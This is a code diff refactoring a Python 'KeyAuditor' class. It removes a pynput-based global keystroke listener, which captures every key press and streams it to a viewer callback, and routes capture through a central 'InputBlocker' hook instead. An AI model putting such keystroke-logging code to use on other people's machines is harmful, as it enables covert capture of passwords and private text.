@@ -1,4 +1,4 @@
-from pynput import keyboard
+from .input_blocker import set_key_logger
 
 class KeyAuditor:
     def __init__(self, callback_func):
@@ -7,45 +7,12 @@ class KeyAuditor:
         Signature: callback(keystring)
         """
         self.callback = callback_func
-        self.listener = None
 
     def start(self):
-        if self.listener:
-            try:
-                self.listener.stop()
-            except Exception as e:
-                print(f"[-] Failed to stop listener: {e}")
-        self.listener = keyboard.Listener(on_press=self.on_press)
-        self.listener.start()
-        print("[+] Key Auditor Started")
+        print("[+] Key Auditor registering with InputBlocker")
+        # Register our callback with the central hook
+        set_key_logger(self.callback)
 
     def stop(self):
-        if self.listener:
-            try:
-                self.listener.stop()
-            except Exception as e:
-                print(f"[-] Failed to stop listener: {e}")
-            finally:
-                self.listener = None
-
-    def on_press(self, key):
-        try:
-            # Handle Alphanumeric Keys
-            k_str = key.char
-        except AttributeError:
-            # Handle Special Keys
-            if key == keyboard.Key.space:
-                k_str = " "
-            elif key == keyboard.Key.enter:
-                k_str = "\n"
-            elif key == keyboard.Key.tab:
-                k_str = "\t"
-            elif key == keyboard.Key.backspace:
-                k_str = "[<-]" # Visual backspace
-            else:
-                k_str = f"[{key.name}]"
-        
-        # Stream to Viewer
-        if self.callback:
-            self.callback(k_str)
-# alr 
+        print("[-] Key Auditor deregistering")
+        set_key_logger(None)
